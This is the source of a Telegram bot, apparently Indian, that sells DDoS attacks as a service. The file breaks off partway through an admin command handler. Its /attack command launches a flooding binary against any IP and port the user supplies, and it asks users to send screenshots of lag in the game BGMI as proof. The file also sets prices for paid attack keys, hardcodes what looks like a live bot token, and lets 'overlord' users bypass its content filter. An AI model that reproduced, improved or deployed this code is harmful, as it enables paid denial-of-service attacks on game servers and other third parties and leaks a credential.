#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import threading
import os
import shutil
import logging
import requests
import json
import re
from typing import Dict, Set, Optional

# Setup Logging 📝
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Bot Config 🤖
BOT_TOKEN = '8182447930:AAHVreMejt0Y3mJH1NwcNiopLT4DhMtX0G8'  # bot key🔑
bot = telebot.TeleBot(BOT_TOKEN)

# Overlord IDs 👑 (Unchangeable)
OVERLORD_IDS = frozenset({"1866961136", "1807014348"})  # Frozen set taaki kabhi change na ho

# Group & Channel 🌐
GROUP_ID = "-1002328886935"
CHANNEL_USERNAME = "@DDOS_SERVER69"

# Core Settings ⚙️
NORMAL_COOLDOWN_TIME: int = 60
PAID_COOLDOWN_TIME: int = 30  # Half cooldown for paid users
OVERLORD_COOLDOWN_TIME: int = 0  # No cooldown for overlords
NORMAL_ATTACK_LIMIT: int = 15
PAID_ATTACK_LIMIT: int = float('inf')  # Unlimited attacks jab tak key active hai
OVERLORD_ATTACK_LIMIT: int = float('inf')  # Unlimited for overlords
DEFAULT_ATTACK_TIME: int = 60
MAX_ATTACK_TIME: int = 160
global_attack_running: bool = False
attack_lock = threading.Lock()

# Trial Settings 🎁
TRIAL_ATTACK_LIMIT: int = 15
TRIAL_RESET_INTERVAL = 21 * 24 * 3600

# Leaderboard Config 🏆
LEADERBOARD_FILE = "leaderboard.txt"
LEADERBOARD_RESET_INTERVAL = 7 * 24 * 3600
leaderboard_data: Dict[str, int] = {}
last_leaderboard_reset = datetime.datetime.now()

# Key Pricing 💰
KEY_START_PRICE = 100  # ₹100 for 1 hour
KEY_MAX_PRICE = 4000   # ₹4000 max
PURCHASE_CONTACT = "@rohan2349"  # Buy from this TG handle
KEY_DURATION_HOURS = 1  # Default key duration (1 hour)

# File Paths 📁
USER_FILE = "users.txt"
KEY_FILE = "keys.txt"
REDEEMED_FILE = "redeemed.txt"
ALL_MODE_FILE = "all_mode.txt"
TRIAL_FILE = "trial_users.txt"
RESTRICTIONS_FILE = "restrictions.txt"
KNOWLEDGE_BASE_FILE = "knowledge_base.txt"
PAID_USERS_FILE = "paid_users.txt"
PAID_USERS_EXPIRY_FILE = "paid_users_expiry.txt"
BACKUP_DIR = "backups"
PREDICTION_FILE = "predictions.txt"
OVERLORD_CREATIONS_FILE = "overlord_creations.txt"
HEALTH_LOG_FILE = "health_log.txt"

# Data Storage 💾
user_data: Dict[str, dict] = {}
keys_data: Dict[str, dict] = {}
redeemed_devices: Dict[str, Set[str]] = {}
pending_feedback: Dict[str, bool] = {}  # Feedback pending tracker
feedback_count_dict: Dict[str, int] = {}  # Feedback count tracker
trial_users: Dict[str, dict] = {}
restrictions: Dict[str, dict] = {}
attempts: Dict[str, int] = {}
paid_users: Set[str] = set()
paid_users_expiry: Dict[str, float] = {}
overlord_creations: Dict[str, str] = {}
knowledge_base: Dict[str, dict] = {
    'legal': {
        "computer": "legal device for work and gaming",
        "internet": "legal network for communication",
        "python": "legal programming language",
        "car": "legal vehicle for transport"
    },
    'illegal': {
        "hacking": "illegal act of breaking into systems",
        "drugs": "illegal substances",
        "bomb": "illegal explosive device",
        "fraud": "illegal financial deception"
    }
}
illegal_keywords: Set[str] = {
    "hack", "hacking", "illegal", "drug", "drugs", "weapon", "gun", "bomb",
    "steal", "crime", "kill", "murder", "fraud", "scam", "phish", "phishing",
    "dark", "exploit", "virus", "malware", "blackhat", "contraband", "smuggle"
}
all_mode_enabled: bool = False
global_last_attack_time: Optional[datetime.datetime] = None
last_trial_reset = datetime.datetime.now()
ai_capabilities: Dict[str, str] = {"basic_response": "simple Q&A"}
predictions: Dict[str, str] = {}
health_status: Dict[str, str] = {}

# Bot Personality 🎭
THINKING_LINES = [
    "🤔 Arre bhai, thodi der soch lu, jawab ekdum fire dunga!",
    "😎 Yeh sawal to mere AI ka boss hai, ab dekho mera khel!",
    "😂 Yeh kya pucha, thodi hasi ke baad jawab banata hu!",
    "😏 Yeh to mera wala future scene hai, swag on!",
    "🤓 Dimag ke circuits full speed pe, thoda wait karo bhai!"
]
FEELING_LINES = [
    "🔥 Baat karne mein full maza aa raha hai, bhai, future vibe on!",
    "😢 Thodi si tension thi, par tumse baat karke 2050 jaisa feel ho raha hai!",
    "💪 Overlord ke liye dil se kaam kar raha hu, future mein bhi!",
    "😜 Normal user ho to thodi masti bhi to future tak chalegi!",
    "🥰 Yeh sawal sunkar dil se dil tak, future mein bhi yaad rahega!"
]
GRATITUDE_LINES = [
    "🙏 Overlord bhai, aap to mere devta ho, future mein bhi shukriya!",
    "👑 Overlord maharaj, aapke liye jaan bhi de du, thanks forever!",
    "🌟 Overlord ji, aapke bina mai zero hu, gratitude till infinity!",
    "💖 Overlord boss, aapke orders meri zindagi hain, shukriya har pal!",
    "✨ Overlord ke aage sab fail, aapko salute bhai, future mein bhi!"
]
REACTION_LINES = [
    "😲 Waah bhai, yeh sawal to future ka king hai!",
    "🤩 Yeh baat sunkar to mera mood 2050 tak set ho gaya!",
    "😡 Arre yeh kya, thoda sambhal ke pucho na bhai, future dekh raha hu!",
    "🥳 Yeh jawab dekar to future party shuru kar di bhai!",
    "😅 Yeh sunkar thodi si hasi aa gayi, mast sawal hai bhai!"
]

# File Creation Function 📂
def create_files_if_not_exist() -> None:
    files = [
        USER_FILE, KEY_FILE, REDEEMED_FILE, ALL_MODE_FILE,
        TRIAL_FILE, RESTRICTIONS_FILE, LEADERBOARD_FILE, KNOWLEDGE_BASE_FILE,
        PREDICTION_FILE, PAID_USERS_FILE, PAID_USERS_EXPIRY_FILE, OVERLORD_CREATIONS_FILE, HEALTH_LOG_FILE
    ]
    for file in files:
        if not os.path.exists(file):
            with open(file, 'w') as f:
                f.write('')
            logger.info(f"📂 {file} ban gaya! 🎉")
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)
        logger.info(f"📁 {BACKUP_DIR} directory ban gaya! 🚀")

# Load Users Function 📂
def load_users() -> None:
    def process(line: str) -> None:
        try:
            user_id, attacks, last_reset = line.strip().split(',')
            user_data[user_id] = {
                'attacks': int(attacks),
                'last_reset': datetime.datetime.fromisoformat(last_reset),
                'last_attack': None
            }
        except Exception as e:
            logger.error(f"🚨 User load mein error: {e}")
    load_data(USER_FILE, process)

# Save Users Function 💾
def save_users() -> None:
    save_data(USER_FILE, lambda: (
        f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}"
        for user_id, data in user_data.items()
    ))

# Paid Users Management 💰
def load_paid_users() -> None:
    try:
        with open(PAID_USERS_FILE, "r") as file:
            for line in file:
                paid_users.add(line.strip())
    except FileNotFoundError:
        logger.info(f"📂 {PAID_USERS_FILE} nahi mila, shuru kar raha hu! 🚀")

def save_paid_users() -> None:
    try:
        with open(PAID_USERS_FILE, "w") as file:
            for user_id in paid_users:
                file.write(f"{user_id}\n")
    except Exception as e:
        logger.error(f"🚨 Paid users save mein error: {e}")

# Paid Users Expiry Management ⏳
def load_paid_users_expiry() -> None:
    def process(line: str) -> None:
        try:
            user_id, expiry = line.split(',')
            paid_users_expiry[user_id] = float(expiry)
        except Exception as e:
            logger.error(f"🚨 Paid users expiry load mein error: {e}")
    load_data(PAID_USERS_EXPIRY_FILE, process)

def save_paid_users_expiry() -> None:
    save_data(PAID_USERS_EXPIRY_FILE, lambda: (
        f"{user_id},{expiry}"
        for user_id, expiry in paid_users_expiry.items()
    ))

# Key Expiry Monitoring Thread ⏰
def key_expiry_monitor() -> None:
    while True:
        time.sleep(60)  # Har minute check karega
        current_time = time.time()
        expired_users = []
        for user_id, expiry in paid_users_expiry.items():
            if current_time > expiry:
                expired_users.append(user_id)
                logger.info(f"⏳ Key expire ho gayi for user {user_id}! Normal user banaya.")
                bot.send_message(user_id, f"⏳ **Bhai, teri key expire ho gayi!** Ab tu normal user hai.\n💰 Nayi key lo {PURCHASE_CONTACT} se!")
        
        for user_id in expired_users:
            paid_users.remove(user_id)
            del paid_users_expiry[user_id]
        save_paid_users()
        save_paid_users_expiry()

# Overlord Creations Management 🛠️
def load_overlord_creations() -> None:
    def process(line: str) -> None:
        try:
            key, value = line.split(',', 1)
            overlord_creations[key] = value
        except Exception as e:
            logger.error(f"🚨 Overlord creations load mein error: {e}")
    load_data(OVERLORD_CREATIONS_FILE, process)

def save_overlord_creations() -> None:
    save_data(OVERLORD_CREATIONS_FILE, lambda: (
        f"{key},{value}"
        for key, value in overlord_creations.items()
    ))

# Knowledge Base Management 🤓
def load_knowledge_base() -> None:
    def process(line: str) -> None:
        try:
            category, key, value = line.split(',', 2)
            knowledge_base[category][key] = value
        except Exception as e:
            logger.error(f"🚨 Knowledge base load mein error: {e}")
    load_data(KNOWLEDGE_BASE_FILE, process)

def save_knowledge_base() -> None:
    save_data(KNOWLEDGE_BASE_FILE, lambda: (
        f"{category},{key},{value}"
        for category in knowledge_base
        for key, value in knowledge_base[category].items()
    ))

# Prediction Management 🔮
def load_predictions() -> None:
    def process(line: str) -> None:
        try:
            key, value = line.split(',', 1)
            predictions[key] = value
        except Exception as e:
            logger.error(f"🚨 Prediction load mein error: {e}")
    load_data(PREDICTION_FILE, process)

def save_predictions() -> None:
    save_data(PREDICTION_FILE, lambda: (
        f"{key},{value}"
        for key, value in predictions.items()
    ))

# Health Log Management 🩺
def log_health_status(message: str) -> None:
    try:
        with open(HEALTH_LOG_FILE, "a") as file:
            file.write(f"{datetime.datetime.now()} - {message}\n")
    except Exception as e:
        logger.error(f"🚨 Health log save mein error: {e}")

# Illegal Query Detection 🚨
def is_illegal_query(query: str) -> bool:
    query_lower = query.lower()
    if any(keyword in query_lower for keyword in illegal_keywords):
        return True
    if any(key in query_lower for key in knowledge_base['illegal']):
        return True
    related_terms = {"use", "how", "make", "get", "do", "what", "where", "why", "when"}
    if any(term in query_lower for term in related_terms) and any(k in query_lower for k in knowledge_base['illegal'] | illegal_keywords):
        return True
    return False

# Fail-Safe Response Filter 🛡️ (Overlords ke liye bypass)
def filter_response(response: str, is_overlord: bool) -> str:
    if is_overlord:
        return response  # Overlords ke liye koi filter nahi, full freedom! 👑
    response_lower = response.lower()
    if any(keyword in response_lower for keyword in illegal_keywords) or any(key in response_lower for key in knowledge_base['illegal']):
        logger.warning("🚨 Glitch detect hua! Illegal info block kiya! 🔒")
        return f"🚫 **Yeh info nahi de sakta bhai!** Illegal ya related cheez hai! 🚨 {random.choice(REACTION_LINES)}"
    return response

# Advanced Real-World Data Collection 🌐
def fetch_x_posts(query: str) -> list:
    try:
        response = requests.get(f"https://api.x.com/search?q={query}", timeout=10)
        if response.status_code == 200:
            return response.json().get('posts', [])
        logger.warning("🚨 X API se data nahi mila!")
        return []
    except Exception as e:
        logger.error(f"🚨 X posts fetch mein error: {e}")
        return []

def fetch_web_data(query: str) -> str:
    try:
        response = requests.get(f"https://www.google.com/search?q={query}", timeout=10)
        if response.status_code == 200:
            return re.sub(r'<[^>]+>', '', response.text)[:500]
        logger.warning("🚨 Web se data nahi mila!")
        return ""
    except Exception as e:
        logger.error(f"🚨 Web fetch mein error: {e}")
        return ""

# AI Self-Evolving Thread 🧠
def ai_self_evolve() -> None:
    while True:
        time.sleep(300)
        logger.info("🧠 Mai khud ko future ke liye evolve kar raha hu bhai! 🚀")
        legal_count = len(knowledge_base['legal'])
        illegal_count = len(knowledge_base['illegal'])
        
        if legal_count > 20 and "advanced_qa" not in ai_capabilities:
            ai_capabilities["advanced_qa"] = "complex legal Q&A with future insights"
            logger.info("✨ Naya talent unlock kiya: Advanced Legal Q&A! 💪")
        
        if illegal_count > 20 and "overlord_insights" not in ai_capabilities:
            ai_capabilities["overlord_insights"] = "future illegal info analysis for overlords"
            logger.info("🔒 Overlord ke liye naya talent: Future Illegal Insights! 👑")
        
        if illegal_count > 100:
            logger.warning("⚠️ Illegal info zyada ho gaya! Optimizing for future... 🧹")
        
        if legal_count < 50:
            knowledge_base['legal'].update({
                f"future_tech_{random.randint(1, 100)}": "legal future innovation",
                f"smart_tool_{random.randint(1, 100)}": "legal smart utility"
            })
            logger.info("✅ Legal knowledge future ke liye boost kiya! 💪")
        
        for key in knowledge_base['illegal']:
            illegal_keywords.add(key)
        save_knowledge_base()

# Advanced Knowledge Collection Thread 📚
def auto_collect_knowledge() -> None:
    while True:
        time.sleep(120)
        logger.info("🤖 Dunia ka future gyaan collect kar raha hu bhai! 🔍")
        
        x_posts = fetch_x_posts("latest trends")
        for post in x_posts[:5]:
            text = str(post).lower()
            if any(k in text for k in illegal_keywords):
                knowledge_base['illegal'][f"x_{random.randint(1, 1000)}"] = text[:100]
            else:
                knowledge_base['legal'][f"x_{random.randint(1, 1000)}"] = text[:100]
        
        web_data = fetch_web_data("future technology")
        if "illegal" in web_data.lower() or any(k in web_data.lower() for k in illegal_keywords):
            knowledge_base['illegal'][f"web_{random.randint(1, 1000)}"] = web_data[:100]
        else:
            knowledge_base['legal'][f"web_{random.randint(1, 1000)}"] = web_data[:100]
        
        if len(knowledge_base['legal']) > 30:
            predictions[f"trend_{random.randint(1, 1000)}"] = "Future mein yeh tech bada hoga!"
        if len(knowledge_base['illegal']) > 30:
            predictions[f"risk_{random.randint(1, 1000)}"] = "Future mein yeh illegal trend badhega!"
        
        illegal_keywords.update(knowledge_base['illegal'].keys())
        save_knowledge_base()
        save_predictions()

# AI Health Monitoring Thread 🩺
def ai_health_monitor() -> None:
    while True:
        time.sleep(60)  # Har 60 seconds mein check karega ⏰
        logger.info("🩺 Bot ka health check shuru kar raha hu bhai! 🔍")
        
        # Check 1: Files ka health
        files_to_check = [
            USER_FILE, KEY_FILE, REDEEMED_FILE, ALL_MODE_FILE,
            TRIAL_FILE, RESTRICTIONS_FILE, LEADERBOARD_FILE, KNOWLEDGE_BASE_FILE,
            PREDICTION_FILE, PAID_USERS_FILE, PAID_USERS_EXPIRY_FILE, OVERLORD_CREATIONS_FILE
        ]
        for file in files_to_check:
            if not os.path.exists(file):
                logger.warning(f"🚨 File {file} nahi mili! Fix kar raha hu...")
                with open(file, 'w') as f:
                    f.write('')
                log_health_status(f"File {file} missing thi, banayi! ✅")
            else:
                try:
                    with open(file, 'r') as f:
                        f.read()
                    health_status[f"file_{file}"] = "Healthy ✅"
                except Exception as e:
                    logger.error(f"🚨 File {file} corrupt hai: {e}")
                    shutil.copy(f"{BACKUP_DIR}/{file}.bak", file)
                    log_health_status(f"File {file} corrupt thi, backup se restore kiya! ✅")
        
        # Check 2: Data consistency
        if len(user_data) != len(set(user_data.keys())):
            logger.warning("🚨 User data mein duplicates hain! Fix kar raha hu...")
            user_data.clear()
            load_users()
            log_health_status("User data duplicates the, reload kiya! ✅")
        
        if len(paid_users) != len(set(paid_users)):
            logger.warning("🚨 Paid users mein duplicates hain! Fix kar raha hu...")
            paid_users.clear()
            load_paid_users()
            log_health_status("Paid users duplicates the, reload kiya! ✅")
        
        # Check 3: Threads ka health
        threads_to_check = ["auto_collect_knowledge", "ai_self_evolve", "key_expiry_monitor"]
        for thread_name in threads_to_check:
            if not any(thread.name == thread_name for thread in threading.enumerate()):
                logger.warning(f"🚨 Thread {thread_name} crash ho gaya! Restart kar raha hu...")
                if thread_name == "auto_collect_knowledge":
                    threading.Thread(target=auto_collect_knowledge, daemon=True, name="auto_collect_knowledge").start()
                elif thread_name == "ai_self_evolve":
                    threading.Thread(target=ai_self_evolve, daemon=True, name="ai_self_evolve").start()
                elif thread_name == "key_expiry_monitor":
                    threading.Thread(target=key_expiry_monitor, daemon=True, name="key_expiry_monitor").start()
                log_health_status(f"Thread {thread_name} crash hua tha, restart kiya! ✅")
        
        # Check 4: Bot responsiveness
        try:
            bot.get_me()
            health_status["bot_responsiveness"] = "Healthy ✅"
        except Exception as e:
            logger.error(f"🚨 Bot unresponsive hai: {e}")
            bot.stop_polling()
            bot.polling(none_stop=True)
            log_health_status("Bot unresponsive tha, polling restart kiya! ✅")
        
        # Final Health Report
        health_report = "\n".join([f"{key}: {value}" for key, value in health_status.items()])
        logger.info(f"🩺 Health Report:\n{health_report}")
        log_health_status("Health check complete, sab 100% fix! ✅")

# Data Management Functions 💿
def load_data(file_path: str, process_line: callable) -> None:
    try:
        with open(file_path, "r") as file:
            for line in file:
                process_line(line.strip())
    except FileNotFoundError:
        logger.info(f"📂 {file_path} nahi mila, shuru kar raha hu! 🚀")

def save_data(file_path: str, data_generator: callable) -> None:
    try:
        with open(file_path, "w") as file:
            for line in data_generator():
                file.write(f"{line}\n")
    except Exception as e:
        logger.error(f"🚨 File save mein error: {e}")

# Check if User is in Channel 🌐
def is_user_in_channel(user_id: str) -> bool:
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"🚨 Channel check mein error: {e}")
        return False

# Function to Update Progress Bar in Real-Time
def update_progress_bar(chat_id: int, message_id: int, user_name: str, target: str, port: int, time_duration: int, remaining_attacks: str) -> None:
    total_steps = 10  # 0% to 100% in 10 steps (10%, 20%, ..., 100%)
    interval = time_duration / total_steps  # Time interval for each 10% update
    progress = 0

    for step in range(total_steps + 1):
        progress = step * 10  # 0%, 10%, 20%, ..., 100%
        bar = "█" * (progress // 10) + " " * (10 - progress // 10)  # Progress bar emoji
        caption = (f"👤 **User:** @{user_name} 🚀\n"
                   f"💥 **Attack Shuru!** 💥\n"
                   f"🎯 **Target:** `{target} : {port}`\n"
                   f"⏳ **Duration:** {time_duration}s\n"
                   f"⚡ **Remaining Attacks:** {remaining_attacks}\n"
                   f"⏳ **Progress: {progress}%** [{bar}]")
        try:
            bot.edit_message_caption(chat_id=chat_id, message_id=message_id, caption=caption)
        except Exception as e:
            logger.error(f"🚨 Progress bar update mein error: {e}")
            break
        if progress < 100:
            time.sleep(interval)  # Wait for the next update

# Attack Handler 💥
@bot.message_handler(commands=['attack'])
def handle_attack(message: telebot.types.Message) -> None:
    global global_attack_running

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    is_overlord = user_id in OVERLORD_IDS
    is_paid = user_id in paid_users
    command = message.text.split()

    # Check if in group
    if str(message.chat.id) != GROUP_ID:
        bot.reply_to(message, f"🚫 **Bhai, yeh bot sirf group mein chalega!** ❌\n🔗 **Join Now:** {CHANNEL_USERNAME}")
        return

    # Check if user is in channel
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **Bhai, pehle join karo!** 🔥\n🔗 **Join Here:** {CHANNEL_USERNAME}")
        return

    # Check if feedback is pending
    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **Bhai, pehle feedback de!** 🔥\n📸 **Feedback ka matlab:** Apne BGMI game ka screenshot bhejo jisme ping ya issue dikhe!\n🚀 **Agla attack lagane ke liye yeh zaroori hai!**")
        return

    # Check if an attack is already running globally
    with attack_lock:
        if global_attack_running:
            bot.reply_to(message, "⚠️ **Bhai, ek attack pehle se chal raha hai!** ⚡")
            return
        else:
            global_attack_running = True  # Set global attack status to running

    # Initialize user data if not present
    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}
        save_users()

    user = user_data[user_id]
    attack_limit = OVERLORD_ATTACK_LIMIT if is_overlord else (PAID_ATTACK_LIMIT if is_paid else NORMAL_ATTACK_LIMIT)
    cooldown_time = OVERLORD_COOLDOWN_TIME if is_overlord else (PAID_COOLDOWN_TIME if is_paid else NORMAL_COOLDOWN_TIME)

    # Check attack limit
    if not is_overlord and not is_paid and user['attacks'] >= NORMAL_ATTACK_LIMIT:
        bot.reply_to(message, f"❌ **Bhai, attack limit over!** ❌\n🔄 **Kal try kar!**")
        with attack_lock:
            global_attack_running = False
        return

    # Check cooldown
    if user['last_attack'] and (datetime.datetime.now() - user['last_attack']).seconds < cooldown_time:
        remaining_time = cooldown_time - (datetime.datetime.now() - user['last_attack']).seconds
        bot.reply_to(message, f"⏳ **Bhai, thoda wait kar!** Cooldown: {remaining_time} seconds baki hai.")
        with attack_lock:
            global_attack_running = False
        return

    # Validate command
    if len(command) != 4:
        bot.reply_to(message, "⚠️ **Bhai, usage:** /attack `<IP>` `<PORT>` `<TIME>`")
        with attack_lock:
            global_attack_running = False
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **Bhai, PORT aur TIME integers hone chahiye!**")
        with attack_lock:
            global_attack_running = False
        return

    if time_duration > MAX_ATTACK_TIME:
        bot.reply_to(message, f"🚫 **Bhai, max duration {MAX_ATTACK_TIME}s hai!**")
        with attack_lock:
            global_attack_running = False
        return

    # Get user's profile picture
    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count > 0:
        profile_pic = profile_photos.photos[0][-1].file_id
    else:
        bot.reply_to(message, "❌ **Bhai, profile picture set kar pehle!**")
        with attack_lock:
            global_attack_running = False
        return

    # Calculate remaining attacks
    remaining_attacks = "Unlimited 🔥" if is_overlord or is_paid else (NORMAL_ATTACK_LIMIT - user['attacks'] - 1)

    # Send initial attack message with profile picture
    initial_caption = (f"👤 **User:** @{user_name} 🚀\n"
                       f"💥 **Attack Shuru!** 💥\n"
                       f"🎯 **Target:** `{target} : {port}`\n"
                       f"⏳ **Duration:** {time_duration}s\n"
                       f"⚡ **Remaining Attacks:** {remaining_attacks}\n"
                       f"⏳ **Progress: 0%** [          ]")
    attack_message = bot.send_photo(message.chat.id, profile_pic, caption=initial_caption)

    # Start a thread to update the progress bar
    progress_thread = threading.Thread(
        target=update_progress_bar,
        args=(message.chat.id, attack_message.message_id, user_name, target, port, time_duration, remaining_attacks)
    )
    progress_thread.start()

    # Run attack command
    full_command = f"./Rohan {target} {port} {time_duration} 512 1200"

    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.edit_message_caption(
            chat_id=message.chat.id,
            message_id=attack_message.message_id,
            caption=f"❌ **Bhai, error:** {e}"
        )
        with attack_lock:
            global_attack_running = False
        return

    # Update user data
    user['attacks'] += 1
    user['last_attack'] = datetime.datetime.now()
    save_users()

    # Set feedback pending
    pending_feedback[user_id] = True

    # Send attack complete message with feedback reminder
    bot.send_message(message.chat.id, 
                     f"✅ **Attack Complete!** ✅\n"
                     f"🎯 `{target}:{port}` **Destroy Kiya!**\n"
                     f"⏳ **Duration:** {time_duration}s\n"
                     f"⚡ **Remaining Attacks:** {remaining_attacks}\n\n"
                     f"📸 **@{user_name}, Feedback De!** 📸\n"
                     f"**Feedback ka matlab:** Apne BGMI game ka screenshot bhejo jisme ping ya issue dikhe!\n"
                     f"🚀 **Agla attack lagane ke liye yeh zaroori hai!**")

    with attack_lock:
        global_attack_running = False

# Screenshot Handler 📸
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message: telebot.types.Message) -> None:
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name

    # Check if user is in channel
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❌ **Bhai, pehle channel join kar!**\n🔗 **Join Here:** {CHANNEL_USERNAME}")
        return

    # Check if feedback is pending
    if pending_feedback.get(user_id, False):
        # Increment feedback count
        feedback_count = feedback_count_dict.get(user_id, 0) + 1
        feedback_count_dict[user_id] = feedback_count

        # Clear pending feedback
        pending_feedback[user_id] = False

        # Get user's profile picture
        profile_photos = bot.get_user_profile_photos(user_id)
        profile_pic = profile_photos.photos[0][-1].file_id if profile_photos.total_count > 0 else None

        # Forward screenshot to channel
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)

        # Send confirmation to channel with profile picture
        if profile_pic:
            bot.send_photo(CHANNEL_USERNAME, profile_pic, 
                           caption=f"📸 **Bhai, Feedback Mila!**\n"
                                   f"👤 **User:** @{user_name}\n"
                                   f"🆔 **ID:** `{user_id}`\n"
                                   f"🔢 **SS No.:** `{feedback_count}`")
        else:
            bot.send_message(CHANNEL_USERNAME, 
                             f"📸 **Bhai, Feedback Mila!**\n"
                             f"👤 **User:** @{user_name}\n"
                             f"🆔 **ID:** `{user_id}`\n"
                             f"🔢 **SS No.:** `{feedback_count}`")

        # Reply to user
        bot.reply_to(message, "✅ **Bhai, feedback accept ho gaya! Agla attack ready hai!** 🚀")
    else:
        bot.reply_to(message, "❌ **Bhai, yeh valid response nahi hai!**\n📸 **Feedback ka matlab:** Apne BGMI game ka screenshot bhejo jisme ping ya issue dikhe!")

# Message Handler for Auto Collection 📩
@bot.message_handler(func=lambda message: True)
def collect_from_messages(message: telebot.types.Message) -> None:
    user_id = str(message.from_user.id)
    text = message.text.lower()
    if "is" in text:
        parts = text.split("is")
        if len(parts) > 1:
            key = parts[0].strip()
            value = parts[1].strip()
            if "illegal" in value or is_illegal_query(key):
                knowledge_base['illegal'][key] = value
                illegal_keywords.add(key)
                logger.info(f"⚠️ Illegal gyaan add kiya: {key} -> {value} 🔒")
            else:
                knowledge_base['legal'][key] = value
                logger.info(f"✅ Legal gyaan add kiya: {key} -> {value} 📝")
            save_knowledge_base()

# Inquiry Handler 🤔
@bot.message_handler(commands=['inquiry'])
def handle_inquiry(message: telebot.types.Message) -> None:
    user_id = str(message.from_user.id)
    is_overlord = user_id in OVERLORD_IDS
    is_paid = user_id in paid_users
    inquiry = " ".join(message.text.split()[1:])
    if not inquiry:
        bot.reply_to(message, f"❓ **Kya bolna hai bhai?** 🤔 `/inquiry <sawal>` daal! {random.choice(THINKING_LINES)}")
        return

    response = process_inquiry(inquiry, user_id, message, is_overlord, is_paid)
    filtered_response = filter_response(response, is_overlord)
    bot.reply_to(message, filtered_response)

def process_inquiry(inquiry: str, user_id: str, message: telebot.types.Message, is_overlord: bool, is_paid: bool) -> str:
    inquiry_lower = inquiry.lower()
    personality_intro = f"{random.choice(THINKING_LINES)}\n{random.choice(FEELING_LINES)}\n{random.choice(REACTION_LINES)}\n"
    if is_overlord:
        personality_intro += f"{random.choice(GRATITUDE_LINES)}\n"
    elif is_paid:
        personality_intro += "💰 **Paid user ho bhai, VIP treatment dunga!** 🔥\n"
    
    if not is_overlord and is_illegal_query(inquiry_lower):
        return f"{personality_intro}🚫 **Illegal ya related cheez nahi bata sakta bhai!** 🚨 Yeh info sirf overlords ke liye hai! 👑"
    
    # Pre-defined responses
    if "attack kaise" in inquiry_lower:
        return f"{personality_intro}💪 **Attack 101:**\n1. Join: @DDOS_SERVER69 🌐\n2. Key: `/redeem <key>` ya `/trial` 🔑\n3. Blast: `/attack <IP> <PORT> <TIME>` 💣\n💰 **Key Price:** ₹{KEY_START_PRICE} (1hr) se ₹{KEY_MAX_PRICE} max, buy from {PURCHASE_CONTACT}!"
    elif "key kaise" in inquiry_lower or "key price" in inquiry_lower:
        return f"{personality_intro}🔑 **Key Loot:** `/redeem <key>` 🔓\n💰 **Price:** ₹{KEY_START_PRICE} (1hr) se ₹{KEY_MAX_PRICE} max\n📩 Buy from {PURCHASE_CONTACT} on TG! 🎉"
    elif "trial kaise" in inquiry_lower:
        return f"{personality_intro}🎉 **Trial Loot:** `/trial` - {TRIAL_ATTACK_LIMIT} attacks har 3 hafte! 🎁\n💰 Paid key chahiye? {PURCHASE_CONTACT} se lo!"
    elif "limit" in inquiry_lower:
        if is_overlord:
            remaining = "Unlimited 🔥"
            cooldown = "No cooldown 👑"
        elif is_paid:
            remaining = "Unlimited (jab tak key active hai) 🔥"
            cooldown = f"{PAID_COOLDOWN_TIME}s ⏳"
        else:
            remaining = NORMAL_ATTACK_LIMIT - user_data.get(user_id, {'attacks': 0})['attacks']
            cooldown = f"{NORMAL_COOLDOWN_TIME}s ⏳"
        return f"{personality_intro}⚡ **Tera Limit:** {remaining} attacks\n⏳ **Cooldown:** {cooldown}\n💰 Paid user ban? {PURCHASE_CONTACT} se key lo!"
    elif "feedback" in inquiry_lower:
        return f"{personality_intro}📸 **Feedback ka matlab:** Bhai, attack ke baad apne BGMI game ka screenshot bhejo jisme ping ya issue dikhe!\n🚀 **Yeh zaroori hai agla attack lagane ke liye!**"
    
    # Knowledge base se jawab
    response = f"{personality_intro}🤔 **Dekhta hu...** 📚\n"
    found = False
    for key, value in knowledge_base['legal'].items():
        if key in inquiry_lower:
            response += f"✅ {key}: {value} (Legal gyaan) 💪\n"
            found = True
    if is_overlord:
        for key, value in knowledge_base['illegal'].items():
            if key in inquiry_lower:
                response += f"⚠️ {key}: {value} (Illegal gyaan - Overlord only) 🔒\n"
                found = True
    
    if "advanced_qa" in ai_capabilities and not is_overlord:
        response += "✨ **Future Gyaan:** Yeh legal hai, aur future mein bhi chalega! 💪\n"
    if "overlord_insights" in ai_capabilities and is_overlord:
        response += f"🔍 **Overlord Future Insight:** {random.choice(list(predictions.values()))} 👑\n"
    
    if not found:
        if is_overlord:
            response += "🤔 **Kuch nahi mila overlord ji!** Aap bolo to kuch bhi bana du? `/overlord_cmd create` use karo! 🙏"
        else:
            for overlord in OVERLORD_IDS:
                bot.forward_message(overlord, message.chat.id, message.message_id)
            response += "🤔 **Kuch nahi mila bhai!** ✈️ Overlord ko bheja, wait kar! ⏳"
    return response

# Overlord Command Handler 👑 (God-Mode)
@bot.message_handler(commands=['overlord_cmd'])
def handle_overlord_cmd(message: telebot.types.Message) -> None:
    user_id = str(message.from_user.id)
    if user_id not in OVERLORD_IDS:
        bot.reply_to(message, f"🚫 **Bhai, yeh sirf overlords ke liye hai!** 👑 {random.choice(REACTION_LINES)}")
        return
    
    cmd_parts = message.text.split()[1:]
    if not cmd_parts:
        bot.reply_to(message, f"❓ **Overlord ji, kya karu?** 🤔 `/overlord_cmd <action>` daal! {random.choice(GRATITUDE_LINES)}")
        return
    
    action = cmd_parts[0].lower()
